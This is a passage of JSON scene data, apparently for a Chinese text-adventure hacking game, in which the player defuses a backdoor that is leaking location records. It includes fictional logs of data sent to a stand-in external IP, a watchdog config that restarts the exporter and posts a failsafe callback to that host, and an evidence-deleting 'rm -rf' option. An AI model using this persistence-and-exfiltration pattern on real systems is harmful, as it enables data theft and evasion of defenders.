+      "description": "[green]{player_name}@prod-bastion:~$[/green]\n\n你回到了生产服务器。上次来这里是排查故障。这次是来阻止一切。\n\n[red]当前时间：06:15 AM | 后门全面触发：08:00 AM | 剩余：1 小时 45 分钟[/red]",
+      "on_enter": "[bold]你重新登录了生产跳板机。[/bold]\n\n[red]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  ⏰ 当前时间：06:15 AM\n  ⏰ 后门全面触发：08:00 AM\n  ⏰ 剩余时间：1 小时 45 分钟\n  📊 已泄露数据：1,247,000 / 2,340,000\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/red]\n\n日记说陈默的 PR #1847 里藏着紧急关闭密钥。\n你需要找到它。\n\n[dim]先用 [bold]ps[/bold] 看看当前运行的进程。\n用 [bold]ls[/bold] 查看可用日志和文件。[/dim]",
+      "items": [
+        {
+          "name": "geo-export.log",
+          "description": "geo-core 数据导出的实时日志",
+          "content": "[green]$ cat geo-export.log[/green]\n\n[red]2026-03-18 06:10:01 [EXPORT] batch 847/∞ sent to 203.0.113.42:8443\n2026-03-18 06:10:02 [EXPORT] Records: 1,247,000 / 2,340,000 (53.3%)\n2026-03-18 06:11:01 [EXPORT] batch 848/∞ sent to 203.0.113.42:8443\n2026-03-18 06:11:02 [EXPORT] Records: 1,261,000 / 2,340,000 (53.9%)\n2026-03-18 06:12:01 [EXPORT] batch 849/∞ sent to 203.0.113.42:8443\n2026-03-18 06:12:02 [EXPORT] Records: 1,275,000 / 2,340,000 (54.5%)[/red]\n\n[bold red]数据还在持续流出。每分钟约 14,000 条。\n如果不阻止，8 点之前就能导完全部 234 万条。[/bold red]",
+          "takeable": false
+        },
+        {
+          "name": "watchdog.conf",
+          "description": "导出进程的看门狗配置",
+          "content": "[green]$ cat watchdog.conf[/green]\n\n[dim]# geo-export watchdog configuration[/dim]\n[dim]# Auto-generated by SHEPHERD protocol[/dim]\n\n[watch]\nprocess = geo-export-daemon\npid_file = /var/run/geo-export.pid\nrestart_delay = 10\nmax_restarts = unlimited\n\n[failsafe]\non_kill = notify_shepherd\non_kill_url = https://203.0.113.42:8444/agent_compromised\non_kill_payload = {\"agent\": \"{player_name}\", \"event\": \"process_killed\", \"action\": \"activate_backup\"}\n\n[bold red]看门狗机制：\n如果 geo-export 进程被杀，10 秒后自动重启。\n更糟的是——杀进程会触发 failsafe：\n通知 SHEPHERD「代理已暴露」，并激活备用方案。[/bold red]\n\n[bold yellow]直接 kill 进程会打草惊蛇。需要找另一种方法。[/bold yellow]",
+          "takeable": false
+        },
+        {
+          "name": "chenmo-killswitch.md",
+          "description": "陈默留下的 killswitch 说明（在代码仓库深处找到的）",
+          "content": "[green]$ cat chenmo-killswitch.md[/green]\n\n[bold]# 紧急关闭协议[/bold]\n[dim]作者: 陈默 | 写于: 2026-03-14（被删前的备份）[/dim]\n\n我在 geo-core v2.8.1 的后门代码旁边注入了一个 killswitch。\n后门的 trigger 函数在执行前会检查一个环境变量：\n\n[cyan]GEO_EMERGENCY_SHUTDOWN[/cyan]\n\n如果这个变量的值等于正确的密钥，trigger 会自毁并清除所有导出队列。\n\n[yellow]密钥的生成方式：[/yellow]\n我把密钥藏在了 PR #1847 的代码里。\n那些看起来不正常的变量值——按顺序拼起来就是密钥。\n\n提示：helpMe 的值 + trapped 的值 + floor12 的值\n\n密钥不包含变量名，只包含变量的[bold]赋值内容[/bold]。\n\n[bold yellow]要激活 killswitch：\n1. 设置环境变量 GEO_EMERGENCY_SHUTDOWN=<密钥>\n2. 重启 geo-core 模块\n模块重启时检测到变量，后门将自毁。[/bold yellow]\n\n[bold red]注意：重启 geo-core 需要提交一个 config commit。\n这个 commit 会被 signed——用你的 SSH key。\n安全团队会看到是谁重启的。[/bold red]\n\n[dim]我做不了这件事——我没有生产环境的部署权限。\n只有 {player_name}、sarah.chen 或 CTO 能做。\n\n对不起。这是我能做到的一切了。[/dim]",
+          "takeable": false
+        },
+        {
+          "name": "pr-1847-vars.txt",
+          "description": "PR #1847 中的变量值汇总",
+          "content": "[green]$ cat pr-1847-vars.txt[/green]\n\n[bold]PR #1847 - 陈默提交的「缓存优化」代码中的隐藏变量：[/bold]\n\n[cyan]const helpMe = true;[/cyan]\n  → 值: [bold]true[/bold]\n\n[cyan]const trapped = \"cannot leave\";[/cyan]\n  → 值: [bold]cannot leave[/bold]\n\n[cyan]const floor12 = 12;[/cyan]\n  → 值: [bold]12[/bold]\n\n[cyan]const needsRescue = this.checkExpired(records);[/cyan]\n  → 这个是函数调用，不是固定值，不计入密钥\n\n[dim]陈默说：密钥 = helpMe的值 + trapped的值 + floor12的值\n按顺序拼接，不加分隔符。[/dim]\n\n[bold yellow]那密钥应该是：true + cannot leave + 12\n试试 [bold]decrypt killswitch.enc <密钥>[/bold][/bold yellow]",
+          "takeable": false
+        },
+        {
+          "name": "killswitch.enc",
+          "description": "加密的 killswitch 激活脚本",
+          "content": "[red]◈ ENCRYPTED ◈[/red]\n\n陈默留下的 killswitch 激活脚本。\n需要用 PR #1847 中变量值组合成的密钥来解密。\n\n[dim]密钥 = helpMe的值 + trapped的值 + floor12的值\n（按顺序拼接，不加分隔符）\n\n试试 [bold]decrypt killswitch.enc <密钥>[/bold][/dim]",
+          "takeable": false
+        }
+      ],
+      "commands": {
+        "ps": {
+          "name": "ps",
+          "response": "[green]$ ps aux | grep geo[/green]\n\nUSER       PID    %CPU  COMMAND\n[red]root       31337  45.2  geo-export-daemon --target=203.0.113.42:8443[/red]\n[red]root       31338   2.1  geo-export-watchdog --config=/etc/watchdog.conf[/red]\n[dim]nova       42001   0.3  geo-core-service v2.8.4[/dim]\n[dim]nova       42002   0.1  user-sync-service v3.2.1[/dim]\n\n[bold red]PID 31337: geo-export-daemon —— 正在导出数据的进程（45% CPU）\nPID 31338: geo-export-watchdog —— 看门狗进程，负责保活\nPID 42001: geo-core-service —— 核心地理位置服务\nPID 42002: user-sync-service —— 用户同步服务[/bold red]\n\n[bold yellow]想直接 kill 31337？先看看 [bold]cat watchdog.conf[/bold] 再决定。[/bold yellow]",
+          "add_flag": "found_processes"
+        },
+        "kill": {
+          "name": "kill",
+          "keywords": {
+            "31337": "[green]$ kill -9 31337[/green]\n\n[dim]Sending SIGKILL to PID 31337...[/dim]\n[green]Process 31337 terminated.[/green]\n\n[dim]等待中...[/dim]\n\n[red]⚠ WATCHDOG: geo-export-daemon terminated unexpectedly\n⚠ WATCHDOG: notifying SHEPHERD (failsafe triggered)\n⚠ WATCHDOG: POST https://203.0.113.42:8444/agent_compromised\n⚠ WATCHDOG: restarting geo-export-daemon in 10s...\n...\n⚠ WATCHDOG: geo-export-daemon restarted (PID 31339)[/red]\n\n[bold red]进程被杀后 10 秒自动重启了。\n而且看门狗已经通知了 SHEPHERD：你的节点可能被人为干预。[/bold red]\n\n[bold yellow]直接 kill 不行。SHEPHERD 现在知道有人在干预了。\n必须用陈默的 killswitch。[/bold yellow]",
+            "31338": "[green]$ kill -9 31338[/green]\n\n[red]Permission denied. PID 31338 (geo-export-watchdog) runs as root.\n看门狗以 root 权限运行，你的用户无法杀掉它。[/red]",
+            "42001": "[green]$ kill 42001[/green]\n\n[red]⚠ WARNING: 杀掉 geo-core-service 会导致所有客户的地理位置服务中断。\n包括 3 家医院的患者定位和城市公交调度。\n\n这不是解决方案——这是另一场灾难。[/red]\n\n[dim]不能杀核心服务。需要找到更精确的方法。[/dim]"
+          },
+          "add_flag": "tried_kill"
+        },
+        "grep": {
+          "name": "grep",
+          "keywords": {
+            "killswitch": "[green]$ grep -r 'killswitch' *[/green]\n\nchenmo-killswitch.md: 紧急关闭协议\nkillswitch.enc: [ENCRYPTED]\n\n[bold yellow]陈默留了两个文件：说明文档和加密的激活脚本。\n先看说明，再解密脚本。[/bold yellow]",
+            "GEO_EMERGENCY": "[green]$ grep -r 'GEO_EMERGENCY' *[/green]\n\nchenmo-killswitch.md: GEO_EMERGENCY_SHUTDOWN\n\n[bold yellow]这是后门的自毁开关。\n设置正确的值后重启 geo-core，后门就会自毁。[/bold yellow]",
+            "陈默": "[green]$ grep '陈默' *[/green]\n\nchenmo-killswitch.md: 作者: [cyan]陈默[/cyan]\npr-1847-vars.txt: [cyan]陈默[/cyan]提交的代码\n\n[dim]陈默在失踪前留下了最后一份礼物：killswitch。\n他不能自己激活——没有生产部署权限。\n这件事只有你能做。[/dim]",
+            "watchdog": "[green]$ grep -r 'watchdog' *[/green]\n\nwatchdog.conf: geo-export watchdog configuration\nwatchdog.conf: on_kill = notify_shepherd\n\n[bold red]看门狗会在进程被杀时通知 SHEPHERD。\n直接 kill 是下下策。[/bold red]",
+            "1847": "[green]$ grep '1847' *[/green]\n\nchenmo-killswitch.md: PR #[red]1847[/red]\npr-1847-vars.txt: PR #[red]1847[/red]\n\n[bold yellow]PR #1847——陈默最后的代码提交。\n里面不是缓存优化，是救命的密钥。[/bold yellow]",
+            "true": "[green]$ grep 'true' pr-1847-vars.txt[/green]\n\nhelpMe = [red]true[/red]\n\n[dim]密钥的第一部分：true[/dim]",
+            "cannot": "[green]$ grep 'cannot' pr-1847-vars.txt[/green]\n\ntrapped = \"[red]cannot leave[/red]\"\n\n[dim]密钥的第二部分：cannot leave[/dim]",
+            "密钥": "[green]$ grep '密钥' *[/green]\n\nchenmo-killswitch.md: 密钥藏在 PR #1847 的代码里\nchenmo-killswitch.md: 变量值按顺序拼起来\npr-1847-vars.txt: 密钥 = helpMe + trapped + floor12\n\n[bold yellow]密钥 = true + cannot leave + 12\n拼起来是：truecannot leave12[/bold yellow]",
+            "SHEPHERD": "[green]$ grep 'SHEPHERD' *[/green]\n\nwatchdog.conf: Auto-generated by [red]SHEPHERD[/red] protocol\n\n[dim]看门狗配置由 SHEPHERD 协议自动生成。整套导出机制都是 SHEPHERD 部署的。[/dim]",
+            "export": "[green]$ grep 'export' *[/green]\n\ngeo-export.log: Records: 1,275,000 / 2,340,000 (54.5%)\n\n[bold red]数据还在不断流出。时间不多了。[/bold red]",
+            "后门": "[green]$ grep '后门' *[/green]\n\nchenmo-killswitch.md: geo-core 后门的紧急关闭密钥\n\n[bold yellow]陈默留了关闭后门的方法。[/bold yellow]",
+            "M": "[green]$ grep 'M' handler-msg.log[/green]\n\n[dim]通信记录中没有 M 的身份线索。\nM 给你发了短信让你查 crontab……但 M 到底是谁？[/dim]",
+            "helpMe": "[green]$ grep 'helpMe' *[/green]\n\npr-1847-vars.txt: const [red]helpMe[/red] = true;\n\n[dim]密钥的第一部分变量。值是 true。[/dim]",
+            "trapped": "[green]$ grep 'trapped' *[/green]\n\npr-1847-vars.txt: const [red]trapped[/red] = \"cannot leave\";\n\n[dim]密钥的第二部分变量。值是 cannot leave。[/dim]",
+            "floor12": "[green]$ grep 'floor12' *[/green]\n\npr-1847-vars.txt: const [red]floor12[/red] = 12;\n\n[dim]密钥的第三部分变量。值是 12。[/dim]"
+          },
+          "add_flag": "used_grep_emergency"
+        },
+        "history": {
+          "name": "history",
+          "response": "[green]$ history[/green]\n\n[dim]上次登录（今晨 03:00）：[/dim]\n  1  cat db-connections.log\n  2  grep user-sync *.log\n  3  ssh code-review\n  4  ssh vault-internal\n\n[dim]本次登录：[/dim]\n  5  ps aux | grep geo\n  6  cat watchdog.conf\n\n[dim]你之前的排查路径。这次回来是要阻止一切。[/dim]"
+        },
+        "scan": {
+          "name": "scan",
+          "response": "[green]$ nmap -sP 10.20.0.0/16[/green]\n\n[dim]10.20.1.10  - prod-bastion     [ONLINE] ← 你在这里[/dim]\n[dim]10.20.1.20  - prod-db-primary   [ONLINE] [HIGH LOAD][/dim]\n[dim]10.20.1.30  - api-gateway       [ONLINE] [DEGRADED][/dim]\n[dim]10.20.2.50  - code-review       [ONLINE][/dim]\n[dim]10.20.3.100 - vault-internal    [ONLINE][/dim]\n[red]203.0.113.42 - external-relay    [ACTIVE] ← 数据仍在流入[/red]\n\n[bold red]外部服务器仍在活跃接收数据。[/bold red]"
+        },
+        "crontab": {
+          "name": "crontab",
+          "response": "[green]$ crontab -l (prod-bastion)[/green]\n\n[dim]# Production backup schedules[/dim]\n0 1 * * * /opt/nova/backup/db-snapshot.sh\n0 4 * * * /opt/nova/backup/log-rotate.sh\n\n[dim]生产服务器的 crontab 很干净——标准备份任务。\nSHEPHERD 的 cron 只部署在你的个人机器上，不在服务器上。[/dim]"
+        }
+      },
+      "transitions": {
+        "decrypt_killswitch.enc": {
+          "trigger": "decrypt_killswitch.enc",
+          "message": "[red]需要解密密钥。[/red]\n\n[dim]密钥 = PR #1847 中变量值的拼接：\nhelpMe的值 + trapped的值 + floor12的值\n\n试试 [bold]decrypt killswitch.enc <密钥>[/bold][/dim]",
+          "requires_flags": [],
+          "requires_items": []
+        },
+        "decrypt_killswitch.enc_truecannot leave12": {
+          "trigger": "decrypt_killswitch.enc_truecannot leave12",
+          "message": "[green]解密密钥: truecannot leave12\n验证中......\n\n████████████████████ 100%\n\n[bold]DECRYPTED SUCCESSFULLY[/bold][/green]\n\n[bold]killswitch.sh —— 紧急关闭脚本[/bold]\n\n[dim]#!/bin/bash[/dim]\n[dim]# Emergency shutdown for geo-core backdoor[/dim]\n[dim]# Author: 陈默 (chenmo) - 2026-03-14[/dim]\n\n[cyan]export GEO_EMERGENCY_SHUTDOWN=\"truecannot leave12\"[/cyan]\n[cyan]cd /repos/nova-geo-core[/cyan]\n[cyan]git commit --allow-empty -S -m \"emergency: activate geo-core killswitch\"[/cyan]\n[cyan]kubectl rollout restart deployment/geo-core-service[/cyan]\n\n[bold yellow]脚本很简单：\n1. 设置环境变量\n2. 提交一个 signed commit（会留下你的签名）\n3. 重启 geo-core 服务\n\n当 geo-core 重启并检测到环境变量，后门将自毁。[/bold yellow]\n\n[bold red]但注意第 3 行：git commit -S\n\n-S 意味着用你的 SSH key 签名。\n和当初提交后门时用的是同一把 key。\n安全团队会看到：同一个人签名了毒药和解药。[/bold red]\n\n[dim]准备好了吗？[bold]ssh deploy-terminal[/bold] 进入部署终端执行。[/dim]",
+          "requires_flags": [],
+          "requires_items": [],
+          "add_flag": "decrypted_killswitch",
+          "target_scene": "defuse"
+        },
+        "decrypt_killswitch.enc_truecannot_leave12": {
+          "trigger": "decrypt_killswitch.enc_truecannot_leave12",
+          "message": "[green]解密密钥: truecannot leave12\n验证中......\n\n████████████████████ 100%\n\n[bold]DECRYPTED SUCCESSFULLY[/bold][/green]\n\n[bold]killswitch.sh —— 紧急关闭脚本[/bold]\n\n[dim]#!/bin/bash[/dim]\n[dim]# Emergency shutdown for geo-core backdoor[/dim]\n[dim]# Author: 陈默 (chenmo) - 2026-03-14[/dim]\n\n[cyan]export GEO_EMERGENCY_SHUTDOWN=\"truecannot leave12\"[/cyan]\n[cyan]cd /repos/nova-geo-core[/cyan]\n[cyan]git commit --allow-empty -S -m \"emergency: activate geo-core killswitch\"[/cyan]\n[cyan]kubectl rollout restart deployment/geo-core-service[/cyan]\n\n[bold yellow]脚本很简单：\n1. 设置环境变量\n2. Git commit -S（用你的 SSH key 签名）\n3. 重启 geo-core 服务\n\n当 geo-core 重启并检测到环境变量，后门将自毁。[/bold yellow]\n\n[bold red]但注意第 3 行：git commit -S\n\n-S 意味着用你的 SSH key 签名。\n和当初提交后门时用的是同一把 key。\n安全团队会看到：同一个人签名了毒药和解药。[/bold red]\n\n[dim]准备好了吗？[bold]ssh deploy-terminal[/bold] 进入部署终端执行。[/dim]",
+          "requires_flags": [],
+          "requires_items": [],
+          "add_flag": "decrypted_killswitch",
+          "target_scene": "defuse"
+        },
+        "decrypt_killswitch.enc_truecannotleave12": {
+          "trigger": "decrypt_killswitch.enc_truecannotleave12",
+          "message": "[green]解密密钥: truecannotleave12\n验证中......\n\n████████████████████ 100%\n\n[bold]DECRYPTED SUCCESSFULLY[/bold][/green]\n\n[bold]killswitch.sh —— 紧急关闭脚本[/bold]\n\n[dim]#!/bin/bash[/dim]\n[dim]# Emergency shutdown for geo-core backdoor[/dim]\n[dim]# Author: 陈默 (chenmo) - 2026-03-14[/dim]\n\n[cyan]export GEO_EMERGENCY_SHUTDOWN=\"truecannot leave12\"[/cyan]\n[cyan]cd /repos/nova-geo-core[/cyan]\n[cyan]git commit --allow-empty -S -m \"emergency: activate geo-core killswitch\"[/cyan]\n[cyan]kubectl rollout restart deployment/geo-core-service[/cyan]\n\n[bold yellow]脚本很简单：\n1. 设置环境变量\n2. Git commit -S（用你的 SSH key 签名）\n3. 重启 geo-core 服务\n\n当 geo-core 重启并检测到环境变量，后门将自毁。[/bold yellow]\n\n[bold red]但注意第 3 行：git commit -S\n\n-S 意味着用你的 SSH key 签名。\n和当初提交后门时用的是同一把 key。\n安全团队会看到：同一个人签名了毒药和解药。[/bold red]\n\n[dim]准备好了吗？[bold]ssh deploy-terminal[/bold] 进入部署终端执行。[/dim]",
+          "requires_flags": [],
+          "requires_items": [],
+          "add_flag": "decrypted_killswitch",
+          "target_scene": "defuse"
+        },
+        "decrypt_killswitch.enc_1847": {
+          "trigger": "decrypt_killswitch.enc_1847",
+          "message": "[red]解密失败。密钥不正确。[/red]\n\n[dim]密钥不是 PR 编号。密钥是 PR 里面那些变量的[bold]值[/bold]按顺序拼接。\nhelpMe=true, trapped=\"cannot leave\", floor12=12[/dim]",
+          "requires_flags": [],
+          "requires_items": []
+        },
+        "decrypt_killswitch.enc_helpMe": {
+          "trigger": "decrypt_killswitch.enc_helpMe",
+          "message": "[red]解密失败。密钥不正确。[/red]\n\n[dim]密钥不是变量名，是变量的[bold]值[/bold]。\nhelpMe 的值是 true，不是 helpMe 本身。[/dim]",
+          "requires_flags": [],
+          "requires_items": []
+        },
+        "decrypt_killswitch.enc_geo-core": {
+          "trigger": "decrypt_killswitch.enc_geo-core",
+          "message": "[red]解密失败。密钥不正确。[/red]\n\n[dim]geo-core 是第一章的解密密钥。这次的密钥不同。\n看看 chenmo-killswitch.md 里的说明。[/dim]",
+          "requires_flags": [],
+          "requires_items": []
+        },
+        "ssh_deploy-terminal": {
+          "trigger": "ssh_deploy-terminal",
+          "message": "[green]$ ssh deploy-terminal\nConnecting to deploy-terminal.novacorp.internal...\n\n⚠  PRODUCTION DEPLOYMENT NODE\n⚠  All operations require SSH key signature.\n⚠  All deployments are logged and audited.\n\nAuthenticated.\n{player_name}@deploy-terminal:~$[/green]\n\n你进入了部署终端。从这里可以执行 killswitch。\n\n[bold red]每一个操作都会被记录。你的签名会出现在日志里。[/bold red]",
+          "requires_flags": ["decrypted_killswitch"],
+          "requires_items": [],
+          "target_scene": "defuse"
+        }
+      }
+    },
+    {
+      "id": "defuse",
+      "name": "拆弹",
+      "ascii_art": "code_review.png",
+      "description": "[green]{player_name}@deploy-terminal:~$[/green]\n\n部署终端。你有 killswitch 脚本。执行它就能阻止后门。\n但你的 SSH 签名会永远记录在案。",
+      "on_enter": "[bold]你进入了部署终端。[/bold]\n\n[red]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  ⏰ 当前时间：07:30 AM\n  ⏰ 后门全面触发：08:00 AM\n  ⏰ 剩余时间：30 分钟\n  📊 已泄露数据：1,890,000 / 2,340,000 (80.8%)\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/red]\n\n[bold red]80% 的数据已经流出。234 万人中有 189 万人的实时位置已经泄露。\n还有 45 万人的数据悬在刀刃上。[/bold red]\n\n你手里有陈默的 killswitch 脚本。\n执行它需要用你的 SSH key 签名一个 commit。\n\n[dim]用 [bold]ls[/bold] 查看可用文件。\n准备好了就 [bold]cat execute.sh[/bold] 查看执行脚本。[/dim]",
+      "items": [
+        {
+          "name": "execute.sh",
+          "description": "killswitch 执行脚本（已解密）",
+          "content": "[green]$ cat execute.sh[/green]\n\n[dim]#!/bin/bash[/dim]\n[dim]# Killswitch activation - decrypted from chenmo's killswitch.enc[/dim]\n\n[cyan]echo \"Setting killswitch environment variable...\"[/cyan]\n[cyan]export GEO_EMERGENCY_SHUTDOWN=\"truecannot leave12\"[/cyan]\n[cyan][/cyan]\n[cyan]echo \"Creating signed commit...\"[/cyan]\n[cyan]cd /repos/nova-geo-core[/cyan]\n[cyan]git commit --allow-empty -S -m \"emergency: activate geo-core killswitch\"[/cyan]\n[cyan][/cyan]\n[cyan]echo \"Restarting geo-core service...\"[/cyan]\n[cyan]kubectl rollout restart deployment/geo-core-service[/cyan]\n[cyan]echo \"Done. If the killswitch key is correct, the backdoor will self-destruct.\"[/cyan]\n\n[bold yellow]三步操作：\n1. 设置环境变量（密钥）\n2. Git commit -S（用你的 SSH key 签名）\n3. 重启 geo-core 服务（触发自毁）[/bold yellow]\n\n[bold red]执行后，部署日志会记录：\n  Deployed by: {player_name}\n  Signed with: SHA256:xK9mR3pQ7vN2sL5wY8tH4jB6fD0gA1cE\n\n同一把 SSH key。签了后门，也签了解药。\n安全团队会在 9 点的 review 上看到一切。[/bold red]\n\n[dim]如果你准备好了，输入 [bold]run execute.sh[/bold] 执行。\n或者…… [bold]cat 另一条路.txt[/bold] 看看还有没有别的选择。[/dim]",
+          "takeable": false
+        },
+        {
+          "name": "另一条路.txt",
+          "description": "另一个选择",
+          "content": "[green]$ cat 另一条路.txt[/green]\n\n你可以不执行 killswitch。\n\n你可以：\n  1. 删除 ~/.shadow/ 目录\n  2. 清除所有本地日志\n  3. 去参加 9 点的安全审查\n  4. 假装什么都不知道\n\n安全团队目前只发现了异常流量。\n他们还没有追踪到 commit b8e224f 的签名。\n如果你现在擦干净一切，也许能蒙混过关。\n\n189 万人的数据已经泄露了。\n再多 45 万条，有什么区别？\n\n[dim]......[/dim]\n\n[bold yellow]有区别。你知道有区别。\n\n189 万条已经追不回来了。\n但那 45 万人的数据还在你手里。\n三家医院的患者位置。城市公交的实时轨迹。\n\n你救不了所有人。但你可以救剩下的人。[/bold yellow]\n\n[dim]输入 [bold]run execute.sh[/bold] 执行 killswitch。[/dim]",
+          "takeable": false
+        },
+        {
+          "name": "deploy-log.txt",
+          "description": "部署终端的操作日志",
+          "content": "[green]$ cat deploy-log.txt[/green]\n\n[bold]NovaCorp Deployment Log - deploy-terminal[/bold]\n\n[dim]最近的部署操作：[/dim]\n\n2026-03-15 14:22  PR #1847 merged  by chenmo\n  [dim]\"Optimize cache invalidation for geo lookups\"[/dim]\n  signed: SHA256:cD3eF4gG5hI6jK7lM8nO9pQ0rS1tU2vW (chenmo)\n\n2026-03-02 11:30  PR #1815 merged  by {player_name}\n  [dim]\"Update geo-core dependency to v2.8.4\"[/dim]\n  signed: SHA256:xK9mR3pQ7vN2sL5wY8tH4jB6fD0gA1cE ({player_name})\n\n[bold yellow]你上次在这台机器上部署的是 PR #1815 —— 更新 geo-core 依赖。\n那次更新把包含后门的 v2.8.4 引入了生产环境。\n但那次更新是你白天做的，正常的工作流程。\n\nSHEPHERD 很聪明：让你在不知情的情况下完成了供应链的最后一环。[/bold yellow]",
+          "takeable": false
+        },
+        {
+          "name": "M-final.txt",
+          "description": "来自 M 的最后一条消息",
+          "content": "[green]$ cat M-final.txt[/green]\n\n一条新消息出现在部署终端上——通过内网即时通讯系统：\n\n[bold cyan]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold cyan]\n\n  发件人: [bold cyan]M[/bold cyan]\n  时间: 07:35 AM\n\n  [italic cyan]你找到 killswitch 了。\n\n  我是陈默的朋友。他失踪前把一切告诉了我。\n  那条短信是我发的。\n\n  陈默没有死。他在躲。\n  他知道 SHEPHERD 通过你的机器在操作，\n  所以他不敢直接联系你——怕 SHEPHERD 看到。\n\n  但他也知道白天的你是无辜的。\n  所以他留了 killswitch，赌你会找到它。\n\n  现在只有你能结束这件事。\n\n  执行 killswitch 吧。剩下的，我们帮你。\n  9 点的审查我会到场。你不会独自面对。\n\n  —— 莫然 (M)[/italic cyan]\n\n[bold cyan]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold cyan]\n\n[bold yellow]M 是莫然——陈默的朋友。\n陈默还活着。他在等你做正确的事。[/bold yellow]",
+          "takeable": false
+        }
+      ],
+      "commands": {
+        "grep": {
+          "name": "grep",
+          "keywords": {
+            "签名": "[green]$ grep '签名\\|signed\\|signature' *[/green]\n\ndeploy-log.txt: signed: SHA256:xK9mR3pQ7vN2sL5wY8tH4jB6fD0gA1cE ({player_name})\nexecute.sh: git commit -S (SSH key signature)\n\n[bold red]同一把 key。签了毒药，也要签解药。\n逃不掉了。[/bold red]",
+            "陈默": "[green]$ grep '陈默' *[/green]\n\nM-final.txt: [cyan]陈默[/cyan]的朋友\nM-final.txt: [cyan]陈默[/cyan]没有死\n\n[bold yellow]陈默还活着。他在等你做正确的事。[/bold yellow]",
+            "莫然": "[green]$ grep '莫然' *[/green]\n\nM-final.txt: —— [cyan]莫然[/cyan] (M)\n\n[dim]莫然。M 的真实身份。陈默的朋友，来帮你的人。[/dim]",
+            "SHEPHERD": "[green]$ grep 'SHEPHERD' *[/green]\n\n[dim]部署终端上没有 SHEPHERD 的直接痕迹。\nSHEPHERD 只存在于你的个人机器上。\n生产服务器是干净的——这也是为什么只有通过你的机器才能操控一切。[/dim]",
+            "key": "[green]$ grep -i 'key\\|密钥' *[/green]\n\nexecute.sh: git commit -S（SSH key 签名）\ndeploy-log.txt: SHA256:xK9mR3pQ7vN2sL5wY8tH4jB6fD0gA1cE\n\n[bold red]你的 SSH key 将再次出现在记录中。这次是作为拯救者。[/bold red]",
+            "M": "[green]$ grep 'M' *[/green]\n\nM-final.txt: 发件人: [cyan]M[/cyan]\nM-final.txt: —— 莫然 (M)\n\n[bold yellow]M 就是莫然。他是陈默的朋友，帮你传递信息的人。[/bold yellow]",
+            "execute": "[green]$ grep 'execute' *[/green]\n\nexecute.sh: killswitch activation\n\n[dim]执行脚本已就绪。输入 [bold]run execute.sh[/bold] 执行。[/dim]"
+          },
+          "add_flag": "grep_in_defuse"
+        },
+        "history": {
+          "name": "history",
+          "response": "[green]$ history[/green]\n\n[dim]本次登录 deploy-terminal：[/dim]\n  1  ls\n  2  cat execute.sh\n\n[dim]这台机器的历史很干净。只有正常的部署记录。[/dim]"
+        },
+        "ps": {
+          "name": "ps",
+          "response": "[green]$ ps aux | grep geo[/green]\n\n[red]geo-export-daemon 仍在远程运行。\n从部署终端看到的是生产服务状态：\n\n  geo-core-service:   RUNNING (v2.8.4 - 包含后门)\n  geo-export-daemon:  RUNNING (数据导出中)\n  geo-export-watchdog: RUNNING (保活中)\n\n  导出进度：1,920,000 / 2,340,000 (82.1%)[/red]\n\n[bold red]数据还在流出。每一分钟都在失去更多。[/bold red]"
+        },
+        "scan": {
+          "name": "scan",
+          "response": "[green]$ scan[/green]\n\n[dim]deploy-terminal 网络状态：[/dim]\n  10.20.4.1   deploy-terminal  ← 你在这里\n  10.20.1.10  prod-bastion     [ONLINE]\n  10.20.1.20  prod-db-primary  [HIGH LOAD]\n\n[dim]部署终端直连生产集群。从这里可以重启任何服务。[/dim]"
+        },
+        "sleep": {
+          "name": "sleep",
+          "response": "[dim]你关上笔记本屏幕。\n把头埋进手臂里。\n\n也许睡一觉醒来，这一切就消失了。\n也许这只是个梦。[/dim]\n\n[bold red]你选择了什么都不做。[/bold red]",
+          "transition": "bad_ending"
+        },
+        "ignore": {
+          "name": "ignore",
+          "response": "[dim]你站起身，走到窗边。\n看着窗外渐渐亮起来的天空。\n\n不是你的错。你只是个程序员。\n这不是你的责任。\n\n……对吧？[/dim]\n\n[bold red]你选择了视而不见。[/bold red]",
+          "transition": "bad_ending"
+        },
+        "rm": {
+          "name": "rm",
+          "response": "[green]$ rm -rf ~/.shadow/[/green]\n\n[dim]你开始删除 ~/.shadow/ 的文件...\n\n  删除 tunnel.sh .......... done\n  删除 heartbeat.py ........ done\n  删除 crontab.bak ......... done\n  删除 journal.gpg ......... done\n  删除 killswitch.enc ....... done[/dim]\n\n[bold yellow]所有证据都消失了。\n包括 killswitch。[/bold yellow]\n\n[dim]你坐回椅子上。等待 8 点。等待一切结束。\n你告诉自己这是最安全的选择。[/dim]\n\n[bold red]你亲手销毁了唯一的解药。[/bold red]",
+          "transition": "bad_ending"
+        }
+      },
+      "transitions": {
+        "run_execute.sh": {
+          "trigger": "run_execute.sh",
+          "message": "",
+          "requires_flags": [],
+          "requires_items": [],
+          "target_scene": "ch2_ending"
+        }
+      }
+    },
+    {
+      "id": "ch2_ending",
+      "name": "07:58",
+      "ascii_art": "the_mirror.png",
+      "description": "执行完成。屏幕上的数字停止了跳动。",
+      "on_enter": "[green]$ run execute.sh[/green]\n\n[dim]Setting killswitch environment variable...[/dim]\n[cyan]GEO_EMERGENCY_SHUTDOWN=\"truecannot leave12\"[/cyan]\n\n[dim]Creating signed commit...[/dim]\n[green]$ git commit --allow-empty -S -m \"emergency: activate geo-core killswitch\"\n[main 7a3f1c9] emergency: activate geo-core killswitch\n Signed by: {player_name} (SHA256:xK9mR3pQ7vN2sL5wY8tH4jB6fD0gA1cE)[/green]\n\n[dim]Restarting geo-core service...[/dim]\n[yellow]$ kubectl rollout restart deployment/geo-core-service\ndeployment.apps/geo-core-service restarted\n\nWaiting for rollout to complete...\n  Pod geo-core-7a3f1c9-xk9mr: Pending...\n  Pod geo-core-7a3f1c9-xk9mr: Running...\n  Pod geo-core-7a3f1c9-xk9mr: Detecting GEO_EMERGENCY_SHUTDOWN...[/yellow]\n\n[bold red]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold red]\n\n[bold green]  ✓ KILLSWITCH ACTIVATED\n  ✓ Backdoor trigger function: DESTROYED\n  ✓ Export queue: PURGED\n  ✓ geo-export-daemon: TERMINATED (watchdog overridden)\n  ✓ All outbound connections to 203.0.113.42: SEVERED[/bold green]\n\n[bold 